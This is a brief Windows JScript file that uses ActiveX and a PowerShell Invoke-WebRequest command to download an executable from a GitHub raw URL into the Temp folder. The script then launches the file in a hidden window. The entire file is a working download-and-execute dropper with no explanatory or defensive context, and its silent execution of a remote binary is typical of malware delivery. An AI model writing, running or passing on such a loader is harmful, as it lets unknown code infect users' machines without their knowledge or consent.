var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");

// Get the path to the Temp folder and define the download location
var exePath = fso.GetSpecialFolder(2) + "\\downloaded.exe";

// Properly formatted PowerShell command
var command = 'powershell -Command "& {Invoke-WebRequest -Uri \'https://github.com/waed69/xxx/raw/refs/heads/main/stream.exe\' -OutFile \'' + exePath + '\'}"';

// Run the command to download the file
shell.Run(command, 0, true);

// Execute the downloaded file
shell.Run('"' + exePath + '"', 0, false);